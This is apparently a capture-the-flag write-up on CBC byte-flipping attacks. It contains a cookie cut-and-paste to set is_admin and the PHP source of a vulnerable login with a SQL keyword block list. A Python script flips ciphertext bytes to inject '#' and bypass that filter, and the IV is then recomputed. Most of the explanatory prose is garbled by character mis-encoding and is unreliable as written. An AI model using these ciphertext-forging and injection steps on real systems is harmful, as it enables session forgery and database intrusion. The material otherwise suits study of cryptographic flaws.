Ê≠§Êó∂ÔºåÊàë‰ª¨Â∫îËØ•ÂÖàÁ°ÆÂÆöÂàÜÁªÑÔºåÂá†‰∏™‰∏∫‰∏ÄÁªÑÔºåÂÖàÁ†¥ÂùèÁ¨¨‰∏ÄÁªÑÂä†ÂØÜÁÑ∂ÂêéÁ†¥ÂùèÁ¨¨‰∫åÁªÑÂä†ÂØÜÔºåÁÑ∂ÂêéÁ°ÆÂÆöËß£ÂØÜÂêéjsonÊï∞ÊçÆ‰∏∫Ôºå {&quot;first_name&quot;:&quot;admin&quot;,&quot;last_name&quot;:&quot;admin&quot;,&quot;is_admin&quot;:0}ÊÄªÂÖ±‰∏∫55‰∏™Â≠óÁ¨¶Ôºå ÊúçÂä°Âô®ÂØÜÊñá‰∏∫Ôºöd37c125ab4eae2ed02428d6d619016b06500bafffbeebe0c011977ad06c6946a45ba82569e93332195a36e61ae1fe26b325f7afd1eaa5ee8bb11efe6eebc5b54‰∏∫128‰∏™Â≠óÁ¨¶Ôºå‰∫îÂçÅ‰∫î‰∏™Â≠óÁ¨¶Ë°•‰Ωç‰∏∫64‰∏™Â≠óÁ¨¶ÔºåÂàÜÁªÑÊµãËØïÁ†¥ÂùèÊØè‰∏ÄÁªÑÔºåÊµãËØïÂà∞‰∏ÄÁªÑÊòéÊñá16‰∏™Â≠óÁ¨¶ÔºåÂä†ÂØÜÂØÜÊñá‰∏∫32‰∏™Â≠óÁ¨¶„ÄÇ ÊòéÊñáÂàÜ‰∏∫ÂõõÁªÑÔºå‰∏ÄÁªÑ16‰∏™Â≠óÁ¨¶ÔºåÂØÜÊñáÂàÜ‰∏∫ÂõõÁªÑÔºå‰∏ÄÁªÑ32‰∏™Â≠óÁ¨¶„ÄÇ d37c125ab4eae2ed 02428d6d619016b0 6500bafffbeebe0c 011977ad06c6946a 45ba82569e933321 95a36e61ae1fe26b 325f7afd1eaa5ee8 bb11efe6eebc5b54ÂèØÊéßÁöÑËåÉÂõ¥ÊòØÊàë‰ª¨ËæìÂÖ•ÁöÑË¥¶Âè∑ÂØÜÁ†Å admin admin„ÄÇ {‚Äúfirst_name‚Äù:‚Äù ‰∏∫ÂçÅ‰∫î‰∏™Â≠óÁ¨¶ÔºåÊàë‰ª¨È¶ñÂÖàÊûÑÈÄ†Ë¥¶Âè∑‰∏∫ a1.0000000000000} ÂÖ∂‰∏≠aÊòØ‰∏∫‰∫ÜÂ°´ÂÖÖÁ¨¨‰∏ÄÁªÑÔºåËøôÊ†∑Á¨¨‰∏ÄÁªÑÂ∞±ÊòØ{‚Äúfirst_name‚Äù:‚Äùa,ËøôÊ†∑Ââ©‰∏ãÁöÑ1.0000000000000}Â∞±ÊòØÂçÅÂÖ≠‰∏™Â≠óÁ¨¶‰∏∫‰∏ÄÁªÑÔºåÁ¨¨‰∫åÁªÑÂ∞±ÊòØ1.0000000000000}ÔºåËøôÊ†∑ÊúçÂä°Âô®Âä†ÂØÜÂêéËøîÂõûÁöÑÁ¨¨33-64‰ΩçÂä†ÂØÜÂ∞±ÊòØ1.0000000000000}ÔºåÊàë‰ª¨ËÆ©ÊúçÂä°Âô®Â∏ÆÊàë‰ª¨Âä†ÂØÜÔºåËøôÊ†∑Êàë‰ª¨Â∞±‰∏çÈúÄË¶ÅÁü•ÈÅìÂØÜÈí•ÂíåÁÆóÊ≥ïÔºåËÆ©ÊúçÂä°Âô®Â∏ÆÊàë‰ª¨Âä†ÂØÜ‰ªª‰ΩïÊàë‰ª¨ÊÉ≥Ë¶ÅÁöÑ‰∏úË•øÔºåÊèê‰∫§Êï∞ÊçÆ„ÄÇ ÂèØ‰ª•ÁúãÂà∞ÊúçÂä°Âô®ËøîÂõû‰∫ÜÂä†ÂØÜÂêéÁöÑÂÜÖÂÆπ„ÄÇÊàë‰ª¨Êà™ÂèñÁ¨¨33‰Ωç-64‰ΩçÂ≠óÁ¨¶„ÄÇÂç≥‰∏∫1.0000000000000}ÁöÑÂØÜÊñá„ÄÇ 3af6e4a9e05c702b02f9f4288c1c605cÊé•‰∏ãÊù•Â∞±ÊòØÈúÄË¶ÅÂ°´ÂÖÖ‰ΩçÊï∞„ÄÇÊàë‰ª¨ËÆ©ÊúçÂä°Âô®Ëß£ÂØÜÁöÑjsonÊï∞ÊçÆÊúÄÂêéÁöÑ0ÔΩù‰∏∫Á¨¨65 66‰ΩçÔºåÂõ†‰∏∫Â¶ÇÊûúËøôÊ†∑ÁöÑËØùÔºåÂâç64‰ΩçÂàöÂ•ΩÊòØÂõõÁªÑÔºå65 66‰∏∫‰∏ÄÁªÑÔºåÊ≠£Â•ΩÂ∞ÜÂÆÉ32‰ΩçÁöÑÂØÜÊñáÊõøÊç¢ÊàêÊàë‰ª¨ÊûÑÈÄ†ÁöÑÂØÜÊñá„ÄÇ {‚Äúfirst_name‚Äù:‚Äùadmin‚Äù,‚Äùlast_name‚Äù:‚Äùadmin‚Äù,‚Äùis_admin‚Äù:0} ‰∫îÂçÅ‰∫î‰ΩçÁöÑÂ≠óÁ¨¶‰∏≤ÔºåÊàë‰ª¨ËÆ©Â•ΩË¥¶Âè∑Âèò‰∏∫admin12345678900,ÈÇ£‰πàÂ≠óÁ¨¶‰∏≤Â∞±ÊòØ66‰ΩçÔºåÊ≠£Â•ΩÁ¨¶ÂêàÂ§ö‰ΩôÂá∫Êù•ÁöÑ‰∏§‰ΩçÊòØ0ÔΩùÔºåÊúÄÂêéËøô‰∏§‰ΩçË¢´Â°´ÂÖÖ‰πãÂêéÁöÑÂØÜÊñáÂêåÊ†∑ÊòØ32‰ΩçÔºåËøôÊ†∑Â∞±ÂèØ‰ª•ÊõøÊç¢Êàë‰ª¨ÊûÑÈÄ†ÁöÑ32‰ΩçÂØÜÊñá„ÄÇ ÂèØ‰ª•ÁúãÂà∞ÊúçÂä°Âô®ÊûÑÈÄ†ÊàêÂäüÂæóÂà∞flag„ÄÇ ÊÄªÁªì‰∏Ä‰∏ã‰∏äÈù¢ÊÄùË∑ØÔºåÊàë‰ª¨Ê†πÊçÆÊØè‰∏ÄÁªÑÁöÑÂä†ÂØÜÂØÜÊñáÈïøÂ∫¶Âõ∫ÂÆöÊòéÊñáÈïøÂ∫¶Âõ∫ÂÆöÔºåÊâÄ‰ª•Â°´ÂÖÖ‰ΩçÊï∞ÔºåÁÑ∂ÂêéËÆ©Êàë‰ª¨ÊÉ≥Ë¶ÅÁöÑÊï∞ÊçÆÊàê‰∏∫ÂçïÁã¨ÁöÑ‰∏ÄÁªÑÔºåËÆ©ÊúçÂä°Âô®ËøõË°åÂä†ÂØÜÔºåËøôÊ†∑Êàë‰ª¨Â∞±ÂèØÊéßÂà∂‰ªªÊÑèÊòéÊñáÂä†ÂØÜÔºåÁÑ∂Âêé‰øÆÊîπcookieÈáåÊèê‰∫§ÁöÑÂØÜÊñáÔºåÂ°´ÂÖÖÂ≠óËäÇÔºåËÆ©Êàë‰ª¨ÈúÄË¶ÅÁöÑÂØÜÊñá‰ΩçÁΩÆÊàê‰∏∫ÂçïÁã¨ÁöÑ‰∏ÄÁªÑÔºåÁÑ∂ÂêéÊõøÊç¢Êàë‰ª¨‰πãÂâçÊûÑÈÄ†ÁöÑ‰∏ÄÁªÑÊï∞ÊçÆÔºåËøôÊ†∑Â∞±ÂèØ‰ª•ÁªïËøá„ÄÇ Ê≠§È¢òÂÄºÂæó‰∏ÄÈ¢òÁöÑÊòØÂèåÂºïÂè∑ÂçïÂºïÂè∑ÂèçÊñúÁ∫øÁ≠âË¢´ËøáÊª§‰∫ÜÔºåÊâÄ‰ª•Â∏àÂÇÖ‰ª¨ÂÖ∂‰ªñÈúÄË¶ÅÂºïÂÖ•ÂèåÂºïÂè∑Á≠âÁöÑ‰∏çÁî®Â∞ùËØï‰∫Ü„ÄÇ aes-cbcÂä†ÂØÜËøôÁßçÊ®°ÂºèÊòØÂÖàÂ∞ÜÊòéÊñáÂàáÂàÜÊàêËã•Âπ≤Â∞èÊÆµÔºåÁÑ∂ÂêéÊØè‰∏ÄÂ∞èÊÆµ‰∏éÂàùÂßãÂùóÊàñËÄÖ‰∏ä‰∏ÄÊÆµÁöÑÂØÜÊñáÊÆµËøõË°åÂºÇÊàñËøêÁÆóÂêéÔºåÂÜç‰∏éÂØÜÈí•ËøõË°åÂä†ÂØÜ„ÄÇaes- IVÔºöÁî®‰∫éÈöèÊú∫ÂåñÂä†ÂØÜÁöÑÊØîÁâπÂùóÔºå‰øùËØÅÂç≥‰ΩøÂØπÁõ∏ÂêåÊòéÊñáÂ§öÊ¨°Âä†ÂØÜÔºå‰πüÂèØ‰ª•ÂæóÂà∞‰∏çÂêåÁöÑÂØÜÊñá„ÄÇ ÁßòÈí•ÔºöÁî®‰∫éÂä†ÂØÜ„ÄÇ ÂØÜÊñáÂùó0ÔºöÁ¨¨‰∏ÄÁªÑÂØÜÊñáË¢´Âä†ÂØÜÂêéÁöÑÂÜÖÂÆπ„ÄÇÔºàÂêåÊ†∑‰πüÊòØÁ¨¨‰∫åÁªÑÊòéÊñáÂä†ÂØÜËøáÁ®ã‰∏≠ÁöÑIVÔºâ cbcÂä†ÂØÜÊñπÂºè‰∏çÈöæÁêÜËß£ÔºåÂ∞Ü‰∏Ä‰∏≤ÊòéÊñáËøõË°åÂàÜÁªÑÔºå‰∏æ‰æã 123456789 123‰∏∫Á¨¨‰∏ÄÁªÑÔºå456‰∏∫Á¨¨‰∫åÁªÑÔºå789‰∏∫Á¨¨‰∏âÁªÑÔºåÂ∞Ü123‰∏éIVÂºÇÊàñÂä†ÂØÜÔºàÂä†ÂØÜ‰∏≠IVÂè™Âú®Á¨¨‰∏ÄÊ¨°ÂºÇÊàñÊúâÁî®ÔºâÔºåÂæóÂà∞ÁöÑÂºÇÊàñÂêéÁöÑÂØÜÊñá‰∏éÂØÜÈí•Âä†ÂØÜÔºåÂÅáËÆæÊ≠§Êó∂Á¨¨‰∏ÄÁªÑÂä†ÂØÜÁöÑÊúÄÁªàÂØÜÊñá‰∏∫abcÔºåÈÇ£‰πà456ÂÖà‰∫éÁ¨¨‰∏ÄÁªÑÁöÑÂØÜÊñáabcÂºÇÊàñÂä†ÂØÜÔºåÂæóÂà∞ÁöÑÂºÇÊàñÂØÜÊñáÂú®‰∏éÂØÜÈí•Âä†ÂØÜÔºåÂÅáËÆæÁ¨¨‰∫åÁªÑÊúÄÁªàÂØÜÊñá‰∏∫defÔºåÂæÄÂ§çÂæ™ÁéØÔºådef‰∏éÁ¨¨‰∏âÁªÑÊòéÊñáÂºÇÊàñÔºåÁÑ∂ÂêéÂíåÂØÜÈí•Âä†ÂØÜÔºåÂÅáËÆæÂØÜÊñághiÔºåÈÇ£‰πàÊúÄÁªàÂØÜÊñáÂ∞±ÊòØ abcdefghiÂπ∂‰∏îÂ∞ÜivÂèëÈÄÅ„ÄÇÂÖ∂‰∏≠ÂÄºÂæó‰∏ÄÊèêÁöÑÊòØÂàùÂßãÂßãÂåñÂêëÈáèIVÊØèÊ¨°ÈöèÂç≥ÂàùÂßãÂåñÔºåÊâÄ‰ª•Âç≥‰ΩøÁõ∏ÂêåÁöÑÂ≠óÁ¨¶‰∏≤‰πü‰∏ç‰ºöÊúâÁõ∏ÂêåÁöÑÂØÜÊñá„ÄÇ cbcÂ≠óËäÇÂèçËΩ¨ÊîªÂáªÈÇ£‰πàËøôÁßçÂú®ËøôÁßçÂä†ÂØÜÁöÑÊñπÂºè‰∏ãÔºåÂπ∂‰∏çÂÆâÂÖ®ÔºåÈóÆÈ¢òÂá∫Âú®ÂºÇÊàñÂä†ÂØÜËøôÈáåÔºåÂú®ËÆ≤Ëß£Â≠óËäÇÂèçËΩ¨ÊîªÂáªÂâçÂÖà‰∫ÜËß£‰∏ãÂºÇÊàñÂä†ÂØÜ„ÄÇ ÂºÇÊàñ xor Á¨¶Âè∑Ë°®Á§∫‰∏∫ ^ ÔºåËÆ°ÁÆóÊú∫‰∏≠ ‰∏§‰∏™Êï∞Â≠óÂºÇÊàñÔºåÁõ∏Âêå‰∏∫0Ôºå‰∏çÂêå‰∏∫1„ÄÇ 1^1=0 0^1=1 Â¶ÇÊûúÊòØÂ≠óÊØçÂºÇÊàñÂä†ÂØÜÔºåa^bÔºåÈÇ£‰πàÈ¶ñÂÖàËΩ¨Âåñ‰∏∫asciiÁºñÁ†ÅÔºåÁÑ∂Âêé‰∫åËøõÂà∂ÔºåÂØπÊØè‰∏Ä‰ΩçËøõË°åÂºÇÊàñÂæóÂà∞ÁöÑÁªìÊûúËΩ¨‰∏∫ÂçÅËøõÂà∂ÔºåÂú®asciiÁºñÁ†ÅÂá∫Êù•„ÄÇ ÂºÇÊàñÊúâ‰∏Ä‰∏™ÁâπÊÄßÔºå‰ªªÊÑèÂÄº‰∏éËá™Â∑±Êú¨Ë∫´ÂÅöÂºÇÊàñËøêÁÆóÁöÑÁªìÊûúÈÉΩÊòØ0Ôºå‰ªªÊÑèÂÄº‰∏é0ÂÅöÂºÇÊàñËøêÁÆóÁöÑÁªìÊûúÈÉΩÊòØËá™Â∑±„ÄÇÊú¨Ë∫´a^b=‰π±‰∏ÉÂÖ´Á≥üÔºåa^aÂàô‰∏∫Á©∫Ôºå‰ΩÜÊòØa^a^‰ªªÊÑèÂ≠óÊØç=‰ªªÊÑèÂ≠óÊØç„ÄÇ Âú®CBCËß£ÂØÜ‰∏≠ÔºåÂ¶ÇÂõæAÊòØÁ¨¨‰∏ÄÁªÑÁöÑÂØÜÊñáÔºåBÊòØÁ¨¨‰∫åÁªÑË¢´Ëß£ÂØÜÁöÑÂØÜÊñáÔºàÊú™ÂºÇÊàñÔºâÔºåCÊòØÊòéÊñá„ÄÇC=A^B„ÄÇÈÇ£‰πàB=C^AÔºå‰∏îA^B^C=0„ÄÇÂ¶ÇÊûúÊàë‰ª¨Êõ¥ÊîπAÔºåA‰∏∫Êàë‰ª¨ÂèØÊéßÁöÑÂØÜÊñáÔºåC=A^B,Â¶ÇÊûúÊàë‰ª¨‰ΩøA=B^XÔºåB=C^A,ÊâÄ‰ª•A=C^A^X,C=C^A^X^B=B^X^B=X„ÄÇËøôÈáåXÊòØÊàë‰ª¨ÈúÄË¶ÅÁöÑ‰ªªÊÑèÂ≠óÁ¨¶ÔºåËøô‰æøÊòØCBCÂ≠óËäÇÂèçËΩ¨ÊîªÂáªÁöÑÊ†∏ÂøÉÔºåËøôÊ†∑‰∏ÄÊù•CÁöÑÊòéÊñáÂ∞±ÂÆåÂÖ®ÂèØÊéß‰∫Ü„ÄÇ ÁÆÄÂçïÁöÑÁôªÂΩï-cbcÂ≠óËäÇÂèçËΩ¨ÂéüÁêÜËØ¥‰∫ÜÂæàÂ§öÔºåÈÇ£‰πàÊé•‰∏ãÊù•ÂÆûÊàò‰∏Ä‰∏ã„ÄÇ ÂÆûÈ™åÂêßÈ¢òÁõÆÔºöhttp://ctf5.shiyanbar.com/web/jiandan/index.php È¶ñÂÖàÔºåËæìÂÖ•Ê°ÜÈöè‰æøËæìÂÖ•ÔºåÁÑ∂ÂêéÂèëÈÄÅËØ∑Ê±ÇÊäìÂåÖÔºåÁúãÂà∞ËøîÂõûÂåÖÁöÑÂ§¥ËØ∑Ê±ÇÊúâtipsÔºåtest.php„ÄÇËÆøÈóÆtest.phpÂç≥ÂèØÁúãÂà∞Ê∫êÁ†Å„ÄÇ &lt;?php define(&quot;SECRET_KEY&quot;, &apos;***********&apos;); define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;); error_reporting(0); include(&apos;conn.php&apos;); function sqliCheck($str){ if(preg_match(&quot;/\\\|,|-|#|=|~|union|like|procedure/i&quot;,$str)){ return 1; } return 0; } function get_random_iv(){ $random_iv=&apos;&apos;; for($i=0;$i&lt;16;$i++){ $random_iv.=chr(rand(1,255)); } return $random_iv; } function login($info){ $iv = get_random_iv(); $plain = serialize($info); $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);//$plain‰∏∫Ë¶ÅÂä†ÂØÜÁöÑÊòéÊñáÔºåMETHODÂä†ÂØÜÊñπÊ≥ïÔºåSECRET_KEYÊòØÁßòÈí•ÔºåOPENSSL_RAW_DATA‰∏∫Êï∞ÊçÆÊ†ºÂºèÔºå$ivÈöèÊú∫ÁîüÊàêÁöÑÂàùÂßãÂåñÂêëÈáè„ÄÇ setcookie(&quot;iv&quot;, base64_encode($iv)); setcookie(&quot;cipher&quot;, base64_encode($cipher)); } function show_homepage() { global $link; if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;])) { $cipher = base64_decode($_COOKIE[&apos;cipher&apos;]); $iv = base64_decode($_COOKIE[&quot;iv&quot;]); if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)) { $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&lt;/p&gt;&quot;); $sql=&quot;select * from users limit &quot;.$info[&apos;id&apos;].&quot;,0&quot;; $result=mysqli_query($link,$sql); if(mysqli_num_rows($result)&gt;0 or die(mysqli_error($link))){ $rows=mysqli_fetch_array($result); echo &apos;&lt;h1&gt;&lt;center&gt;Hello!&apos;.$rows[&apos;username&apos;].&apos;&lt;/center&gt;&lt;/h1&gt;&apos;; } else{ echo &apos;&lt;h1&gt;&lt;center&gt;Hello!&lt;/center&gt;&lt;/h1&gt;&apos;; } } else { die(&quot;ERROR!&quot;); } } } if(isset($_POST[&apos;id&apos;])){ $id = (string)$_POST[&apos;id&apos;]; if(sqliCheck($id)) die(&quot;&lt;h1 style=&apos;color:red&apos;&gt;&lt;center&gt;sql inject detected!&lt;/center&gt;&lt;/h1&gt;&quot;); $info = array(&apos;id&apos;=&gt;$id); login($info); echo &apos;&lt;h1&gt;&lt;center&gt;Hello!&lt;/center&gt;&lt;/h1&gt;&apos;; }else{ if(isset($_COOKIE[&quot;iv&quot;])&amp;&amp;isset($_COOKIE[&apos;cipher&apos;])){ show_homepage(); }else{ echo &apos;&lt;body class=&quot;login-body&quot; style=&quot;margin:0 auto&quot;&gt; &lt;div id=&quot;wrapper&quot; style=&quot;margin:0 auto;width:800px;&quot;&gt; &lt;form name=&quot;login-form&quot; class=&quot;login-form&quot; action=&quot;&quot; method=&quot;post&quot;&gt; &lt;div class=&quot;header&quot;&gt; &lt;h1&gt;Login Form&lt;/h1&gt; &lt;span&gt;input id to login&lt;/span&gt; &lt;/div&gt; &lt;div class=&quot;content&quot;&gt; &lt;input name=&quot;id&quot; type=&quot;text&quot; class=&quot;input id&quot; value=&quot;id&quot; onfocus=&quot;this.value=\&apos;\&apos;&quot; /&gt; &lt;/div&gt; &lt;div class=&quot;footer&quot;&gt; &lt;p&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot; class=&quot;button&quot; /&gt;&lt;/p&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt;&apos;; } } ?&gt;ÂâçÊèêÔºöËøô‰∏ÄÂÖ≥‰∏çÊòØÂçïÁ∫ØÊ≥®ÂÖ•È•∂ËøáÁöÑÔºåËÇØÂÆöË¶ÅÂà©Áî®cbcÂ≠óËäÇÂèçËΩ¨ÊîªÂáª„ÄÇ 1.È¶ñÂÖàÁõ¥Êé•ÁúãÂú®Âì™ÈáåÂèØ‰ª•ÂæóÂà∞flagÔºåÊ≤°‰º†ÂÖ•IDÂèÇÊï∞ÁöÑÊó∂ÂÄôÔºåÂ¶ÇÊûúcookieÂª∫Á´ã‰∫Üiv Âíå cipherÂèÇÊï∞ÔºåÈÇ£‰πàÂ∞±ÂèØ‰ª•Ë∞ÉÁî®show_homepageÔºåÊâßË°åsqlÊü•ËØ¢ÔºåflagÂú®Êï∞ÊçÆÂ∫ìÈáåÊü•ËØ¢„ÄÇ 2.‰ΩÜÊòØËÇØÂÆöË¶Å‰º†ÂèÇidÔºåÂÖàÁîüÊàêiv Âíå cipherÔºåÂ∞Üid=XËØ•Êï∞ÁªÑËøõË°åÂ∫èÂàóÂåñ‰πãÂêéÔºå‰ª•Â∫èÂàóÂåñÁªìÊûúÂíå‰∏Ä‰∏™bs64ÁºñÁ†ÅÈöèÊú∫Êï∞ivËøõË°åcbcÂä†ÂØÜÁîüÊàêÂØÜÊñácipher,Âä†ÂØÜÁÆóÊ≥ï‰∏∫aes-128-cbcÔºåÊ≠§Êó∂Â∞±Ë¶ÅËÄÉËôëcbcÂ≠óËäÇÂèçËΩ¨‰∫ÜÔºå128‰ΩçÔºåÊåâÂçÅÂÖ≠Â≠óËäÇÂàÜÁªÑ„ÄÇÁîüÊàêivÂíåcipher‰πãÂêéurlÁºñÁ†ÅËøîÂõûËØ∑Ê±ÇÂ§¥ÔºåÁîüÊàêÁªÜËäÇÂèÇËÄÉËá™ÂÆö‰πâloginÂáΩÊï∞„ÄÇ 3.sqlÊü•ËØ¢ËØ≠Âè•ÊãºÊé•‰∫Ü‰∏Ä‰∏™0ÔºåÊâÄ‰ª•Êàë‰ª¨Âè™Ë¶ÅÊ≥®ÈáäÊéâ0‰æøÂèØËøõË°åÊàë‰ª¨ÁöÑÊü•ËØ¢„ÄÇÊâÄ‰ª•ÂèØ‰ª•Âà©Áî®cbcÂ≠óËäÇÁøªËΩ¨ÊîªÂáªÊõ¥ÊîπÂØÜÊñáÔºåÊõ¥ÊîπËß£ÂØÜÂêéÁöÑidÔºå‰ªéËÄåÁªïËøáËøõË°åsqlwafÔºåcookie‰º†ÂÖ•ÂèÇÊï∞ cipherÂíåiv,base64Ëß£Á†ÅÁÑ∂ÂêéaesËß£ÂØÜÔºåphpÂèçÂ∫èÂàóÂåñÔºåÂ¶ÇÊûú‰∏çËÉΩÂèçÂ∫èÂàóÂåñÔºåÂàôËæìÂá∫base64ÁºñÁ†ÅÔºåÂê¶ÂàôÂ∞±sqlËØ≠Âè•ÊãºÊé•Êü•ËØ¢„ÄÇÂ¶ÇÊûúÊúâÁªìÊûúÂõûÊòæÔºåÂê¶ÂàôËæìÂá∫hello„ÄÇ Áªº‰∏äÔºåÂè™Ë¶ÅÊàë‰ª¨ËÉΩÂ§üCBCËøõË°åÂ≠óËäÇÂèçËΩ¨Â∞±ÂèØ‰ª•ÊâßË°åsqlÊü•ËØ¢ÔºåÂ∞±ÂèØ‰ª•ËøõË°åÊü•ËØ¢flag„ÄÇ Êé•‰∏ãÊù•Á¨¨‰∏ÄÊ≠•È¶ñÂÖàË¶ÅcbcÂ≠óËäÇÂèçËΩ¨Ôºå‰øÆÊîπÂØÜÊñá‰∏≠ÁöÑid„ÄÇ‰∏çÂ¶®ÂÖàÊµãËØï‰∏ã‰ΩçÊï∞ÔºåÂ¶ÇÊûú‰º†ÂÖ•id=12ÔºàÂõ†‰∏∫Êàë‰ª¨Ë¶Å‰øÆÊîπ‰∏∫1#ÔºâÔºåÂàôÂ∫èÂàóÂåñÂêéÂÜÖÂÆπ‰∏∫ a:1:{s:2:&quot;id&quot;;s:2:&quot;12&quot;;}Áî±‰∫éÊàë‰ª¨ÈúÄË¶ÅÂàÜÁªÑÔºåaes-128-cbcÔºå128‰Ωç16Â≠óËäÇÂàÜÁªÑ Á¨¨‰∏ÄÁªÑÔºö a:1:{s:2:&quot;id&quot;;s: Á¨¨‰∫åÁªÑÔºö 2:&quot;12&quot;;}10‰∏≠ÁöÑ0ÊòØÁ¨¨‰∫åÁªÑÁöÑÁ¨¨‰∫î‰∏™Â≠óÁ¨¶ÔºåÊâÄ‰ª•ÈúÄË¶ÅÊõ¥ÊîπÁ¨¨5‰∏™Â≠óÁ¨¶ÔºåÂè≥ÂÅèÁßªÂõõ‰∏™Â≠óÁ¨¶ÔºåÁ¨¨‰∏ÄÁªÑ‰πüË¶ÅÂêëÂè≥ÂÅèÁßªÂõõ‰∏™Â≠óÁ¨¶„ÄÇÊé•‰∏ãÊù•Â∞±ÊòØcbcÂ≠óËäÇÂèçËΩ¨ËÑöÊú¨„ÄÇ # -*- coding:utf8 -*- from base64 import * import urllib cipher=&apos;fn060OBP%2FyLIGYrD9bi%2FlWWAS9RIWvEtALaV26kuB%2F8%3D&apos;#Âä†ÂØÜÂêéÁöÑÂØÜÊñá cipher_raw=b64decode(urllib.unquote(cipher))#È¶ñÂÖàurldecodeËß£Á†ÅÔºåÁÑ∂Âêébase64Ëß£Á†Å cipher_raw_list=list(cipher_raw)#Â∞ÜËß£Á†ÅÁöÑÂØÜÊñáÂàÜÁªÑ py=4#ÂÅèÁßªÈáè‰∏∫4 A=cipher_raw_list[py]#Ë¶ÅÂºÇÊàñÁ¨¨‰∫åÁªÑÂØÜÊñáÁöÑ‰ΩçÁΩÆ C=&apos;2&apos;#Á¨¨‰∫åÁªÑË¢´ÊõøÊç¢ÁöÑÊòéÊñá X=&apos;#&apos;#Â∞ÜÁ¨¨‰∫åÁªÑÊõøÊç¢ÊéâÁöÑÊòéÊñá cipher_raw_list[py]=chr(ord(A)^ord(C)^ord(X))#Â∞ÜÂÅèÁßªÈáè‰∏∫4ÁöÑÊõøÊç¢„ÄÇ cipher_new=&apos;&apos;.join(cipher_raw_list)#‰ΩøÁî®&apos;&apos;Â∞ÜÊØè‰∏Ä‰∏™Â≠óÁ¨¶ËøûÊé•Ëµ∑Êù•Ôºå cipher_new=urllib.quote(b64encode(cipher_new))#Â∞ÜÊõøÊç¢ÂÆåÁöÑÂØÜÊñábase64ÁºñÁ†ÅÔºåurlencodeÁºñÁ†Å„ÄÇ print cipher_new#ÊâìÂç∞Âá∫ÊúÄÁªàÂØÜÊñáÂÖ∂‰∏≠ÁâπÊÑèÂ∞ÜACXÁ≠âÂèòÈáèÂØπÂ∫î‰∏äÊñáÊâÄËÆ≤ÁöÑÂèÇÊï∞„ÄÇÂèØÂèÇËÄÉ‰∏äÈù¢cbcÂ≠óËäÇÂèçËΩ¨ÈÖçÂêàÂõæÊù•ÁêÜËß£„ÄÇÁÑ∂ÂêéÁîüÊàêÂèçËΩ¨ÂêéÁöÑÂØÜÊñáÔºö fn060PFP/yLIGYrD9bi/lWWAS9RIWvEtALaV26kuB/8%3DÊ≠§Êó∂Êèê‰∫§ÂØÜÊñáÂèëÈÄÅÊúçÂä°Âô®‰ºöËøîÂõûbase64ÁºñÁ†ÅÂ≠óÁ¨¶‰∏≤Êó†Ê≥ïÂèçÂ∫èÂàóÂåñ„ÄÇ ÂéüÂõ†‰∏∫‰∏ãÈù¢ËøôÂè•„ÄÇ Êé•‰∏ãÊù•Êàë‰ª¨ÈúÄË¶Å‰øÆÊîπIVÔºåÂéüÁêÜÂæàÁÆÄÂçïÔºåÊàë‰ª¨ÂàÜ‰∏∫‰∏§ÁªÑÊù•ËøõË°åÂä†Ëß£ÂØÜÔºåÁ¨¨‰∏ÄÁªÑÂØÜÊñáÂè™ÂèÇ‰∏éÁ¨¨‰∫åÁªÑÁöÑÂºÇÊàñÔºåÁ¨¨‰∏ÄÁªÑ‰øÆÊîπÂÆåÊàêÂêéÔºåÁ¨¨‰∫åÁªÑÁöÑËß£ÂØÜÊòØÂÆåÂÖ®Ê≤°ÊúâÈóÆÈ¢òÁöÑÔºå‰ΩÜÊòØÁ¨¨‰∏ÄÁªÑË¢´Êàë‰ª¨‰øÆÊîπ‰∫Ü‰∏Ä‰∏™Â≠óÁ¨¶Ôºå‰ΩÜÊòØÂºÇÊàñÁöÑIVËøòÊòØÂéüÊù•ÁöÑIVÔºåÂøÖÈ°ªË¶Å‰øÆÊîπIVÊâçËÉΩ‰ΩøÁ¨¨‰∏ÄÁªÑÊ≠£Â∏∏ÂºÇÊàñÔºåÂæóÂà∞ÁªìÊûú„ÄÇËøòÊòØ‰∏äËø∞ÂéüÁêÜÔºå‰∏âÊ¨°ÂºÇÊàñÔºåÊéßÂà∂ÊÉ≥Ë¶ÅÁöÑÁªìÊûú„ÄÇ ËøôÈáåÂú®ÁúãÂõæÔºå AÔºöËøôÈáåÁâπÂà´Ë¶ÅËØ¥ÊòéÊ≥®ÊÑèÔºåAÊòØÊàë‰ª¨Á¨¨‰∏ÄÊ¨°Â≠óËäÇÂèçËΩ¨‰πãÂêéÁöÑÊòéÊñáÔºàÂ∫èÂàóÂåñÁä∂ÊÄÅÔºâBÔºöÂéüÊù•ÁöÑIVCÔºöÂ≠óËäÇÂèçËΩ¨ÂêéËß£ÂØÜÂêéÁöÑÁ¨¨‰∏ÄÁªÑÔºàÊú™Ë¢´ÂºÇÊàñÔºâD: Ê≠£Â∏∏ÁöÑÂ∫èÂàóÂåñÂ≠óÁ¨¶‰∏≤ ‚Äòa:1:{s:2:‚Äùid‚Äù;s:‚ÄôEÔºöÊñ∞ÁöÑIV A=B^C,Âõ†‰∏∫Êàë‰ª¨AÊòØÂ≠óËäÇÂèçËΩ¨ËøôÈáåÊàë‰ª¨ÂèØ‰ª•ÁúãÂà∞ÔºåIVÊòØÂéüÊù•ÁöÑIVÔºå‰ΩÜÊòØAÂíåCÈÉΩÊòØÂ≠óËäÇÂèçËΩ¨ÂêéÁöÑÔºåÊâÄ‰ª•AÂøÖÁÑ∂ÊòØ‰∏™Êó†Ê≥ïÂèçÂ∫èÂàóÂåñÁöÑÊòéÊñáÔºåÊàë‰ª¨‰øÆÊîπB‰πüÂ∞±ÊòØIVÔºå‰ΩøÂæóÂºÇÊàñÂæóÂà∞Ê≠£Â∏∏ÁöÑÂ∫èÂàóÂåñÂ≠óÁ¨¶‰∏≤„ÄÇ B=A^C,Êàë‰ª¨ÈúÄË¶ÅÂæóÂà∞ÁöÑÁªìÊûúÊòØD=E^CÔºåËÄåC=B^AÔºåÊâÄ‰ª•D=E^B^A,ÈÇ£‰πàE=B^A^D„ÄÇ 